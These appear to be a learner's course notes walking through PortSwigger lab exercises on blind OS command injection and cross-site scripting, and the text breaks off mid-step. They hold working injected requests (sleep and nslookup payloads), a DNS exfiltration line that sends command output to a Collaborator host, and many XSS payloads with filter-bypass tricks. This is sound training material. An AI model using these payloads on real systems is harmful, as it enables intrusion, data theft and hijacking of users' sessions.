Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a5d006904516cba8379b42900bf003d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a5d006904516cba8379b42900bf003d.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

csrf=ktODArjTWDPYLzKAKVzYyjMDuKfpwhin&name=Maheswaran&email=ddhdhd%40test.com&subject=dhheee&message=dud+come+to+this+plce+tomorrow+

-> We can see that all the input values are going as part of the request as Request Body parameters 
-> lets try to edit the requestbody parameters, especially email which has the vulberability 

Modified request:

csrf=ktODArjTWDPYLzKAKVzYyjMDuKfpwhin&name=Maheswaran&email=ddhdhd%40test.com;pwd&subject=dhheee&message=dud+come+to+this+plce+tomorrow+


Response for Modified Request:

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2

{}

-> so we are not able to see the response for the modified request , even if the command is executed on the target system.

c) Hence we are going to execute a command which is going to delay the execution of application 
-> We will use the sleep command for the same  

eg:
[mahesh@GS1-MAHESWAR-LX ~]$ sleep 5
[mahesh@GS1-MAHESWAR-LX ~]$

-> This sleep command upon executing , i wont be able to see the prompt for 5 seconds 
-> So if i inject this command to a target application and if the target application is vulnerable to a command 
execution - i dont need to even see the result , if the target application sleeps for the specified duration - then 
i can be sure that the target application is vulnerable and executing my commands 
-> hence doing this , i just enough for Bounty 

d) Lets modify the request with sleep :
-> Here we should give + for sleep, since it is a http request 


Request: 
POST /feedback/submit HTTP/2
Host: 0a20001a03bcfb53810d3e6c00e60097.web-security-academy.net
Cookie: session=R5W9SAC3WQjitViZSR0Mo6EuNmevQ5wP
Content-Length: 118
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a20001a03bcfb53810d3e6c00e60097.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a20001a03bcfb53810d3e6c00e60097.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

csrf=wOvQYv3UfSmwh5CkZ6iVkBiRnlQikdVD&name=Maheswaran&email=ddhdhd%40test.com;sleep+10&subject=dhheee&message=dsswwwww


Response:
HTTP/2 500 Internal Server Error
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

"Could not save"

-> Here 500 means server refused to execute the request we sent to it 
-> Since we got response without delay, we are sure that the command we specified here did not work 

######
The HTTP status code 500 is a generic error response. 
It means that the server encountered an unexpected condition that prevented it from fulfilling the request.
##############


e) Now lets modify the request by adding a semi colon after sleep 10 and see if command gets executed 

eg:
Request:
csrf=wOvQYv3UfSmwh5CkZ6iVkBiRnlQikdVD&name=Maheswaran&email=ddhdhd%40test.com;sleep+10;&subject=dhheee&message=dsswwwww


Response:
HTTP/2 500 Internal Server Error
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

"Could not save"


-> Here too we got internal server error, but in this case we had a delay of 10 seconds in getting the response. 
-> hence we are sure that this is working 


f) Once you find that the target is vulnerable for command injection, we can add payloads which could send a 
reverse connection to your own computer 
-> Then you will be able to communicate with webserver using a normal terminal like this , after reverse connection 


g) || 
->  || operator is a logical OR operator.
-> In essence, the || operator executes the second command only if the first command fails.
 The second echo command didn't run, because the first one was successful.
 
 
 h) To learn about other operators in linux:
 
 https://www.baeldung.com/linux/difference-ampersand-semicolon
 
 
32) Injection Vulnerabilities 1 - OS Command Injection - Discovering Asynchronous Blind Command Injection
a) In previous lesson we saw blind or s command injections, where command gets executed on target server, but we are 
not getting the result of the executed command in the response 
b) Therefore we used sleep commands which delayed the execution of application 
c) In some cases, we might encounter blind or s command execution where command gets executed on target server 
but it will get executed in a new thread. 
-> While using new thread, if you use command that delays the execution - then it will sleep for 10 secs , but web application will continue to run without 
any delay


Target site: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

d) If we add delay and execute request in repeater for the target lab, we get the response without any sleep delay as 
specified in request, unlike the previous lesson where it waited for 10 seconds or so 

Request:
POST /feedback/submit HTTP/2
Host: 0af100f4030d915a851c6db0005b009e.web-security-academy.net
Cookie: session=LZjhf7gWTSVRGzEoHcob1pUcHQgFfN8m
Content-Length: 115
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0af100f4030d915a851c6db0005b009e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af100f4030d915a851c6db0005b009e.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

csrf=e4pkvRxaVPyO7rgkTkCkdgL6Q45V1N5h&name=Maheswaran&email=ddhdhd%40test.com||sleep+10&subject=dhheee&message=dddd


Response:
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2

{}



REASON: 
Application continues to run in main thread and the command for sleep 
gets executed in separate thread 

e) Hence we dont have proof to tell that my sleep command got executed 
f) Hence to create proof that our command has executed:
i) Use ping or nslookup command to make target web application to send request 
to another server that you control 


PING MYSERVER.COM---->TARGET.COM---->MYSERVER.COM

-> Then by observing logs on the server that you control on cloud , you will be able to 
see that the target web application , has made a request to server 
that you specified(MYSERVER.COM), indicating that it executed 
the command that you injected  
ii) TO create MYSERVER.COM, you can create your own hosting or use Collaborator 
feature of Burp so you can get that by Clicking on Burp -> Burp Collaborator client 


f) Collaborator helps you to generate a domain name. 
-> By clicking copy to clickboard, we will get a domain name to which i can make requests 
and i will be able to see results easily here in Collaborator 
-> Instead of creating own server on internet and manually looking 
at the logs - I can simply click on " copy to clipboard" , which creates 
a domain name for me which is available to anybody that is connected to the 
internet 

-> if we copy the link which we copied to clipboard and put in browser, 
in collaborator screen, it will tell the requests made to this collaborator 
link 
-> If we click individual request , we can see that there was a dns lookup and it also shows from IP address and time also 

g) Now copy the link generated from collaborator and use it in injection in repeater :

Original
csrf=e4pkvRxaVPyO7rgkTkCkdgL6Q45V1N5h&name=Maheswaran&email=ddhdhd%40test.com||sleep+10&subject=dhheee&message=dddd

-> instead of sleep , i am going to do an nslookup - a command that helps to map a domain name to its ip 
-> now we will be using domain which was copied from collaborator for the nslookup command 

Changed: 
csrf=e4pkvRxaVPyO7rgkTkCkdgL6Q45V1N5h&name=Maheswaran&email=ddhdhd%40test.com||nslookup+hrcasyakklcmub6yi0oxx2wcnie63.oastify.com||&subject=dhheee&message=dddd

-> If the target application is vulnerable to os command injection vulnerability - it will perform nslookup to this particular domain name 
and therefore i should see the result in my collaborator 

-> now on sending in repeater, we will be able to see in collaborator the dns reques that has come 


h) Thus we have proved that target application is vulnerable to os command injection vulnerability using nslookup command and collaborator 


33) Injection Vulnerabilities 1 - OS Command Injection -Using Burp  Collaborator to exploit Asynchronous Blind command Injection 

-> In last lesson we executed nsloopup or ping command from target application to burp collaborator where we captured the request for asynchronous blind command injection 

-> We will be in situation where we are not able to get interactive shell and we just need more proof to show that we are able to execute commands 

a) In this lesson we will use the exploit which we learnt in previous lesson and use it to execute commands on the server and see the results so that you are not 
simply limited by reading the requests which we get in burp collaborator 
b) We will still use nslookup command but will be changing it, so that we perform an nslookup to the command that   surrounded by back ticks 
-> As a result terminal will execute the command between the two quotes and replace it with the result of the command execution  and pass it as input to nslookup 
command with .myserver.com 


nslookup 'COMMAND'.myserver.com
    |
	|
	|
nslookup COMMAND_RESULT.myserver.com



c) Then we will be able to see the logs of our server and we are going to see that, somebody made a request to the result of execution of my command.server.com 
d) if i go to collaborator, copy clipboard and in terminal if  i try to do 

--> this works only in linux 
nslookup `uname`.sddhdhdh.oastify.com 
--> now if we go to collaborator and check poll now, we will see a request and that will 
be this dns request 


e) We can do the same in repeater by putting nslookup `uname`.collaboratorurl.com 
and we will be able to see the request in the collaborator 

34) Injection Vulnerabilities 2 - XSS Cross Site Scripting 
a) Type of vulberability that allow us to inject 
javascript code into the pages of target website  
b) Code is executed when the page loads 
c) Code is executed on the CLIENT machine not the server 
-> In other vulnerabilities we executed, code is executed on the server, hence 
we can directly use them to hack into the target server 
-> Whereas XSS helps us to inject javascript which gets 
executed by the web browser  


Target Web server <--------Request with XSS Payload ------- Client-Side -----Response with XSS Payloaded -------> Embedded within the page d) Though we can not directly gain access to the website using XSS, -> But when admin of a website while using it - we can use access to steal their cookies or steal their information or even lure them to do something that will allow us to gain access to their computer -> And from their computer we can get access to the target website e) Three main types of XSS vulnerabilities: 1) Reflected XSS 2) Persisten Stored XSS 3) DOM based XSS f) Impact of all the Vulnerabilities is same 1) Reflected XSS Only difference in Reflected XSS is, you will have to send the exploit itself eg: we have to send this link http: target.com page.php?something=
				<script>alert("XSS")</script> 


-> Here target.com is the target website and page.php is the vulnerable page 
-> Final part with script is our exploit code 

-> In reflected, we have to send this link and wait for this to be executed 
-> hence this is called reflected because this is reflected on the browser 
that the url 


2) Stored XSS: 
-> Persistent, stored on the page or DB
-> Injected code is executed everytime the page is loaded 

eg: if you discover a stored XSS in google , the code will be executed 
on every browser that visits google 
-> Whereas if its reflected, you will still need to get your target to manually click the 
link that contains the code 


3) DOM based XSS:
-> Similar to reflected and stored 
-> Can be discovered and exploited similarly 
-> Main difference is that it occurs entirely on the client side 
i.e There is no communication between client and the webserver when we 
exploit such vulnerabilities

-> Payload is never sent to the server 
   No logs, No filters, No server side protection 
   
-> In next lessons we will notice that these vulnerabilities are 
very similar, what differs is the way it gets executed in the background 


35) Injection Vulnerabilities 2 - Injecting a HTML injection vulberability
a) Allows an attacker to inject html code into the page, instead of javascript code 
b) Code is executed when the page loads 
c) Code is executed on the client machine not the server
d) HTML injection is similar to XSS but simpler 
e) HTML injection hints existence of an XSS 

Target website: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded


f) Before trying to see if there is xss, we just try for html 
injection first 


36) Injection Vulnerabilities 2 - XSS Cross Site Scripting  Discovering reflected  xss vulnerabilities:2.1
a) The reason why i check for html injection before checking xss is , HTML is less 
dangerous while XSS is more dangerous 

-> Usually if we are able to discover html injection, most of the cases we will be able to 
convert it into an XSS injection 
-> Hence html injection is a very good indication of existence 
of xss injection 

b) One hint for presence of xss is, if whatever we type in search space, gets 
displayed in ui, then it is telling the presence of xss 

c) Enter javascript in search bar and if it gets executed upon hitting 
search button, then alert gets displayed means we have discovered a 
reflected xss injection vulberability

Exploit:0
<script>alert('Mahesh')</script> 

d) It is called reflected because the only way to get the alert code 
executed on browser is if we copy this link and send to target:

eg:
https://0ae0001f04e921a8847f86e8000f005b.web-security-academy.net/?search=%3Cscript%3Ealert%28%27Mahesh%27%29%3C%2Fscript%3E



37) Injection Vulnerabilities 2 - XSS Cross Site Scripting  Discovering stored  xss vulnerabilities:2.2

STORED XSS:
-> Persistent, stored on the page or DB 
-> Injected code is executed everytime the page is loaded. 

a) When you have comment section and when it is saved, it gets saved in 
DB. 
-> Once it gets saved, everytime UI gets loaded with comment, the Javascript 
code will get executed. this is stored XSS vulnerability 
-> In stored vulberability,we need not share the url with the target 


38) Injection Vulnerabilities 2 - XSS Cross Site Scripting - Intoduction to DOM xss vulnerabilities:2.3

DOM BASED XSS 
a) Similar to reflected and stored XSS 
b) Can be discovered and exploited similarly 
c) Main difference is that it occurs entirely on the client side 
i.e There is no communication between client and web server 
-> So they happen or occur completely within the DOM 
d) Payload is never sent to the server 
-> No logs, No filters, no server side protection 

-> Anykind of protection you do on server side is useless

e) WHile in reflected/stored Xss - javascript goes to backend and hence 
server side protection will be helpfult
-> But in DOM XSS - javascript code does not go to backend , hence any server side protection is useless 
-> In DOM XSS, code gets loaded in browser and gets executed 
eg:

SEARCH:
test<script>alert('XSS')</script> 


set.html.object.value = test<script>alert('XSS')</script> 



39) Injection Vulnerabilities 2 - XSS Cross Site Scripting -  Discovering a Reflected DOM XSS in a Link 2.3

a) As said earlier, discovering and exploiting DOM xss is identical to 
reflected/stored xss 
-> Only difference between these vulnerabilities is the way they happen 
-> But at the end, all of these vulnerabilities allow us to inject the Javascript code 
-> Examples we are going to see herafter, are going to be mix of 
dom, reflected and stored XSS
-> We will notice that discovering them is exactly the same

b) Most important indication to the existence of an XSS is, if the 
user input being used somewhere within the page   
-> Thus by manipulating user input, we might be able to html code which will result in an html 
injection or we might be able to inject javascript code which will result in 
an XSS 

c) Location or context of where the user input is used within the page 
is very important 
-> In all previous examples,user input was being outside of the html tags 

i.e user input is actually displayed as text on the page. 

eg: if there is search bar to enter the text, user input is displayed separately outside the 
search bar

---> -> In all previous examples,user input was being outside of the html tags ,
Hence we are able to inject our own html tags to get an 
html injection 

-> In many cases, user input may be used within another html tag inside the page :2:00 
-> It may be used as part of the link or image link

d) Therefore you wont be able to insert your own html tags or javascript code 
because the browser will simply treat the 
user input as a link and not as hmtl or javascript code 

e) We need to find a  way inject javascript code within href code 

f) 
-> Here we are adding javascript in url , here will add javacript alert 
-> Now when we enter the url - this script does not run
-> We need to click the href element of the page in order to run it 
-> Thus on clicking back link, we can see the javascript getting executed 
 
 
 https://addhewedididi-web-security-academy.net/feedback?returnPath=javascript:alert(3)
 
 
 40) Injection Vulnerabilities 2 - XSS Cross Site Scripting -  Discovering a Reflected  XSS in image tag 
 
 a) Previously we learnt, When user input is 
 used within the page - then the page may be 
 vulnerable to html injection or xss injection 
 b) We also learnt the page where the user input is used is very 
 important - because it limits us or in 
 some cases prevent us from injecting javascript code 
in the page 
c) Hence we need to try injecting javascript code iwthin the 
constraint, in our case the href tag
-> Sometimes user input may be used in a place
that simply does not accept javascript code 
d) For eg: user input may be used  within an image
source 


eg:

Search bar:test
  |
  |
<img src="test"/> 

e) In such cases, we can edit the payload to first complete the 
existing code , exit the constraint that 
we are in and then inject the code that we  
want to execute 


eg:
search:
"><script>alert(2)<script>
  |
  |
  |
<img src="">
							<script>alert(2)</script> /> 


f) 

In search tab enter: "><script>alert(1)</script>

or we can enter in search tab:
"onload=alert(3) >

-> Here i am putting the quote to exit the src of below line: 


<img src="/resoures/images/tracket.gif?searchTerms=</b>">


-> Here onload means we are saying, once this image loads - i 
want to run javascript code  which is alert(3) 


g) THus main learning of this lesson/example is:
1) First close whatever html element you have(make 
sure you complete it)
2) Then inject your code , unless you can inject the 
code within the element 
3) THe element we have is image element, whatever we inject 
was injected withink src  
-> We cannot run javascript within src, hence we 
close it and then inject our code , related to onload
:
eg:1
Search Tab: test 
<img src="test"/>


eg:2 
Search tab: "onload=alert(2)>
	|
	|
<img src="" onload alert(2)>/> 


eg:3

search tab: "><script>alert(2)</script>
	|
	|
	|
<img src="">
									<script>alert(2)</script> />


41) Injection Vulnerabilities 2 - XSS Cross Site Scripting - Injecting Javascript Directly in a Page Script
a) In this example, we will see how user input is 
directly used within javascript code 
b) To highlight the importance of analyzing and 
understanding where the user input is being used 
-> In this example, we will be running javascript code without 
enclosing it any tags 

c) If your search tab, has all protection for 
an xss vulnerability 
-> Then search for all instances of searched code in inpect element and if 
you find the searched text within <script> element 


eg:
<script> 
var searchTerms= 'test';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms) +'">');

</script> 


d) 
Here to override content for searchTerms:
 
var searchTerms= 'test';


';alert(22);//';

-> by putting ',  'test' becomes ''test';
-> putting ';,  ''test' becomes '';test';
---Where we end the statement, so that we can start new 
-> putting ';alert(22); '';test' becomes '';test;alert(22);';
-> Now in script we have extra ';, we can nullify it by adding a command //

putting ';alert(22);//'; '';test' becomes '';test;alert(22);//';

---->Thus the final code will be like this:
Exploit:1
';alert(22);
	 
e) If we put this in search, alert(22) gets executed , thus 
we successfully managed to inject javascript within the page 
 


42) Injection Vulnerabilities 2 - XSS Cross Site Scripting - Discovering XSS in a drop down menu 
####Main thing that we have learnt so far is
that, Until we inject javacript within the 
 element that you have access to: close that element , complete it and then inject it 
after that ####

Target Website: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element



a) In Target lab, we do check stock we will have two 
body parameters:productId=2&storeId=London


-> if we change current url : https://0a2400b704a5c3298123b15d00630085.web-security-academy.net/product?productId=2

to  edit store id:

https://0a2400b704a5c3298123b15d00630085.web-security-academy.net/product?productId=2&storeId=LoNeyveli

b) We can see that the store id gets changed to : LoNeyveli 
c) This tells us that there is a  good chance to do injection in this page 
d) lets inspect the code and see where our text is present and 
see if we can manipulate to inject javascript into it :

<select name="storeId">
												<option selected="">LoNeyveli</option>
												<option>London</option>
												<option>Paris</option>
												<option>Milan</option>
											</select>

e) If i go to url and add script to it :

https://0a2400b704a5c3298123b15d00630085.web-security-academy.net/product?productId=2&storeId=LoNeyveli<script>alert(22)</script> 

-> on entering this url, script gets executed without any problem 


f) As we have seen, discovering this is 
very similar to what we have been doing 
in the previous example 

43) Injection Vulnerabilities 2 - XSS Cross Site Scripting -  
Discovering XSS in AngularJS Application

a) Information gathering crucial for pentesting the 
application , as gathering right infor increases the 
attack surface. 

Target website: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

b) From list of cheat sheets got from different sites like portswigger, git hug we can do injection 
c) 

eg:   {{constructor.constructor('alert(1)')()}}

putting this in search box, triggers the alert 

c) Links :

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://gist.github.com/jeremybuis/38c01acae19fc2ac6959
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html


44)  Injection Vulnerabilities 2 - XSS -ByPassing Security -  
Bypassing Basic Filtering


TargetLab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped


a) Based on the lessons we learnt so far, we will not be able to do xss/html injections, since angle brackets, single, double quotes, backslash and backticks Unicode are filtered . Hence everything we covered so far will not work 
b) In lab page, if we search for text and if we inspect we could find two occurences:


eg:
<section class="blog-header">
												<h1 id="searchMessage">1 search results for 'test'</h1>
												<script>
                            var message = `1 search results for 'test'`;
                            document.getElementById('searchMessage').innerText = message;
                        </script>
												<hr>
                    </section>
					

c) We can see that search text, which is "test' is present within single quotes and other contents of message are present within backticks 

eg:
  var message = `1 search results for 'test'`;
  

d) Usage of backticks in Javascript code: 
-> They are called as template literals, used to display along with other special characters, multi line characters etc 
-> Variables can be displayed using backticks like this `my name is {variableName}

eg:
let firstName = "John";
let lastName = "Doe";

let text = `Welcome ${firstName}, ${lastName}!`;

-> We can also call javacript functions within those curly brackets 




e) To make javascript to be executed in this lab page, enter the following in search tab and we will have an alert thrown with 222


Exploit:2
${alert(222)}


With empty search :
<section class="blog-header">
													<h1 id="searchMessage">5 search results for ''</h1>
													<script>
                            var message = `5 search results for ''`;
                            document.getElementById('searchMessage').innerText = message;
                        </script>
													<hr>
                    </section>



With entering alert:

<section class="blog-header">
														<h1 id="searchMessage">0 search results for 'undefined'</h1>
														<script>
                            var message = `0 search results for '${alert(222)}'`;
                            document.getElementById('searchMessage').innerText = message;
                        </script>
														<hr>
                    </section>
					
-> Javascript is going to evaluate whatever we put 


45)  Injection Vulnerabilities 2 - XSS -ByPassing Security -  Bypassing Single-Quotes Filtering

a) We will be talking about lot of methods to bypass filtering and encoding(measures used by developers) to prevent excess vulnerabilities 


Code for search button:

<section class="blog-header">
															<h1>1 search results for 'test'</h1>
															<hr>
                    </section>
															<section class="search">
																<form action="/" method="GET">
																	<input type="text" placeholder="Search the blog..." name="search">
																		<button type="submit" class="button">Search</button>
																	</form>
																</section>
																<script>
                        var searchTerms = 'test';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>




b) Even if we try the alert javascript which we used earlier, it wont get executed, since some additional filter got 
implemented here : ';alert(22);//

c) Lets analyze what happened? breakdown out of whatever constraints we have 

d) Here this is the part where we are able to enter javascript code 

<script>
    var searchTerms = '\';alert(22);//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

e) While we entered: ';alert(22);//   in search bar , it got converted to: '\';alert(22);//';    in javascript code 

1) \ backward slashes are used to escape a single quote , 

-> while we can use two single quotes to define a string, if we want to use a single quote as part of the string, then we can use backslash

2) Thus programmer of this search bar, has added code to check if your input contains a single quote 
-> if it contains single quote, then program will automatically add backward slash before that single quote 
-> THerefore this prevents us from escaping that quote or string, hence you wont be able to run the javscript code 

eg:
x='someone\'s name' 
-> so backward slash tells compiler to ignore the single quote 

3) Thus programmer checks the input and if it contains single quote , he will add a backward slash to tell compiler to ignore the single quote 
-> Hence hacker wont be able to escape the string and hence not able to run the javascript code 
4) Now to nullify effect of programmer, if we add another slash, then it becomes double slash add thus another \ gets ignored 
-> Hence we come out of string and whatever we put later will not be ignored as string, but will be considered as javascript code and get 
executed on the page 

5) consider our example:

x= 'someone\'s name'

-> But if we put this \\, we are saying not to ignore it :
-> Because only a single quote will help ignore next character 
-> Thus by putting \\, we break out of the string 

eg:
x='someone\\'s name'

6) THus the below part of the above string gets executed as code :

s name'

7) Thus to original string: ';alert(22);// , we will be adding an extra backslash to cancel the existing backward slash that the code is automatically adding. 


\';alert(22);//



f) now if we do search with below string, we can see that the javscript cde get executed in the page: 

Exploit:3
\';alert(22);//


46)  Injection Vulnerabilities 2 - XSS -ByPassing Security -  Bypassing Advanced Filtering

Target lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped


a) Lets see the next lesson, which is even more restrictive 
-> This is a stored xss 
b) In this lesson we will be seeing different ways of bypassing protection and filtering 
-> here we know, vulnerability is present in the comment section 
-> we entered comment, name, email, website etc 

-> we are going to inspect website, because that is the one which is vulnerable 

eg:
We can see two instances of google.com, one is with href and another with the onCick event 

eg:
<p>
																			<img src="/resources/images/avatar.svg" class="avatar">
																				<a id="author" href="https://google.com" onClick='var tracker= {track(){}}; tracker.track(' https: google.com');">testname< a>
																			</p>

c) Until now we covered examples where we are able to inject code within href tag or exit the double quotes and inject it as an onclick or hover 
-> Those ways of injecting javascript code is not going to work in this example here 


d) So our next bet is try injecting here :

tracker= {track(){}}; tracker.track('https://google.com');


e) We can try escaping the double quotes in onclick and inject it as a parameter on an event or we can try to get the code to run from within this statement 

var tracker= {track(){}}; tracker.track('https://google.com

-> Because we know the onClick event, defines what javascript should be executed when the name of the comment is actually clicked 

f) We will try to run the javascript code from within this part of the cde:

https://google.com

1) We add ') to complete the javascript code:

https://google.com')

2) Everytime we finish a javascript code, we shold add a semicolon   ;

https://google.com');

3) Programming language will be adding ');  
-> so we will comment and stop adding the text next to it. 


https://google.com');//');

4) Finally we will add our javascripr code here just before the comment 

https://google.com');javscriptcodehere//');


eg:
https://google.com');alert(222);//');



g) Now lets copy this and put another comment 
-> But still our javascript code, does not get executed 


-> The reason why our copied javascript code does not work is, programmer has added code to automatically add a backward slash whenever there is a single quote 
-> This filter is added by programmer to prevent us from breaking outside the string 
-> Hence everthing we injected after it , got considered as part of the string because backward slash is being added in front of our single quote - which tells the browser to ignore the single quote 

h) To solve this issue we can add double backward slashes 

eg: 


-> Here after com wer added a backward slash and web application programmer is going to add another backward slash


https://google.com\');alert(222);//');

i)  Also we dont need this at the end '); 

https://google.com\');alert(222);//

j) But still our javascript code does not get executed. 

-> if we inpsect element and see the code we can see a better programming 
-> When we add our own back slash , it adds two backslashes , to make sure that they dont cancel each other 


<p>
																				<img src="/resources/images/avatar.svg" class="avatar">
																					<a id="author" href="https://google.com" onClick='var tracker= {track(){}}; tracker.track(' https: google.com\\\');">testname< a>
																				</p>


-> Hence the end result is , there are three backslashes and therefore the last backslash is actually going to be used to ignore the single quote 
-> Thus we are not able to break outside the string and we are still remaining within the string and we wont be able to run the javascript code 


k) WHen stuck like this, good idea is to write single quote in a different way 
-> We can try different way that the browser can interpret as a single quote 

-> Our current exploit:

https://google.com'singlequote);alert(44);//


->The problem is : we need browser to interpret this character as single quote without ignoring it 

l) This is something we use with a lot of different exploits :

for eg in sql injections, we convert text into hex, because we are not allowd to use single quotes 

-> We will try say the same thing differntly
---> Encode or decode the string 
---> use a + instead of space 
---> Use two comments instead of a space 
---> use percentage20 (%20) instead of a space 
---> or percentage27 (%27) instead of a quote 

m) one way of saying a single quote differently is using the &apos;

-> @apos; will be interpreted as single quote 
-> Hopefully programmer did not account for this and by this way we will be able to escape his check and this will be interpreted as a single quote 
-> Thus closing the string for us   and all of this will be interpreted as part of the code 

Exploit:4
https://google.com&apos;);alert(44);//


n) Now if we copy the exploit in comment section and click the link we will be able to see the alert , which indicates that our javascript code got executed 

o) LESSON: if you are stuck and not able to bypass whatever constraint you are in: think of other ways that you can say the same thing 

-> may be encode it or decode it 


47)  Injection Vulnerabilities 2 - XSS -ByPassing Security -  Bypassing Server-Side Filtering

Targetwebsite: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

a) In this target lab also we have search bar
-> This lab is different because we have some server side security rules implemented 

b) When we try to enter a normal html <b> tag, it is throwing error that this tag is not allowed:

eg:
input: 
<b>spider</b>

output:
"Tag is not allowed" 

-> The same output comes even if we other tags also 

c) Thus we notice that html injections are not possible on this page, because they are filtering every possible html tag 

d) Lets try a script tag:

eg:
input:
<script>spider</script>

output:
 "Tag is not allowed" 
 
-> Again we get "Tag is not allowed"  


e) Let try entering this:

eg:
input:
<scRipt>spider</scriPt> 

output:
 "Tag is not allowed" 

-> even for this we get "Tag is not allowed"

f) Thus we can come to conclusion that this search bar, has all tags disallowed 

g) Now lets try to enter that tag, that does not exist 

eg:
Input:
<bla>spider</bla> 

Output:
0 search results for 'spider'


-> so we are able to run this page and if we inspect this element , bla got injected in the page, even though it does not have any significance 

h) With this, we can try to use html attributes to inject the javascript code within the tag. to 

-> In <bla>spider</bla>, if we could have an attribute and if that attribute could do something useful on the target page, then we have discovered an xss 

i) There are number of events that we can use to run Javascript 

google for: html events 

#############
https://www.w3schools.com/jsref/dom_obj_event.asp

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

############

j) Lets try one event and use it in search bar.

eg:
Input:
<bla onfocus=alert(2)>spider</bla> output: 0 search results for'spider' -> though script does not get executed, what we put does not get filtered here , which says that we are in right direction -> so we can build our exploit step by step k) -> onfocus event makes sense if you are using it for a textbox. -> Whenever the textbox is in focus , i want you to execute whatever code i put after the onfocus -> Here in our example, bla is not a real html element, hence it cannot be focussed -> We somehow need to tell html that this is a focussable html element l) We do that by giving it a tab index -> if we give tabindex=1, it means: if you press tab button on your keyboard to move through elements on html page , this should be one of the elements you can tab through -> it is an element that we can focus ---> Basically we are telling the browser, the bla elements should be treated like a text box, so that it can be focussed -> once bla gets focussed, javascript will get executed Exploit:5
																					<bla onfocus=alert(2) tabindex=1>spider</bla> m) Now if we click search with this exploit , we get"0 search results for 'spider'" but if we inpsect code we can find:
																					<h1>
"0 search results for '"
<bla onfocus="alert(2)" tabindex="1">spider</bla>  

-> Thus nothing from our code got filtered 

n) Now in: "0 search results for 'spider'"

-> if we focus and click on spider, we will have alert of javascript triggered and alert will be opened 


48)  Injection Vulnerabilities 2 - XSS -ByPassing Security -  Bypassing Extreme Filtering with Burp Intruder

Target Website: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

a) As usual we have a search bar and when we enter something:
<b>spider</b> 



Output:
"Tag is not allowed"

b) Instead of <b> lets try a html tag that does not even exist:

<asdad>spider</asdad> 

Output:
0 search results for 'spider' 


Upon Inspect:
<h1> 
"0 search results for '" 
<asdad>spider</asdad> 

-> so our code got injected 


c) Now lets the exact same exploit which we tried earlier: <bla onfocus=alert(2) tabindex=1>spider</bla> Output:"Attribute is not allowed" -> so we are kinda stuck here, because the firewall we have here is pretty good d) Let see how to tackle something like this is general ########XSS INJECTION HUNTING ######################### XSS Injection hunting steps: 1) Try normal use in ui 2) try html injection 3) Try play with actual html tags 4) Try with script 5) Try with changed script(scrIPt) 6) Try with HTML element that does not exist(bla) 7) Main Hint: Not usee this in all text box, we should use this only when: If we send a request and you can see the result in the page * it can be obvious display of entered text * text embedded in url * somewhere at the bottom * It will be html when we inspect Important thing: Look if the responses contain anything that you could manipulate through the input -> Whether input is textbox or it was coming from url or from something else ########XSS######################### e) Here we going to see Burp Intruder to see what html elements we can use in here in this text box ############Intruder steps############# 1) I wil go to my xss cheat,"copy tags to clipboard' -> then go to my target page -> turn on Proxy -> submit a normal search with " test"-> in Proxy(intercept)-> right click (send to Intruder) 2) In intruder ->Payloads -> Payload Options(Simple list) -> paste all of the possible html tags from cheatsheet 3) We do this copy, instead of manually tryin every single possible html tag 4) Then go to Intruder -> Positions -> goto first line : GET ?search=$test$ HTTP 1.1 5) Remove 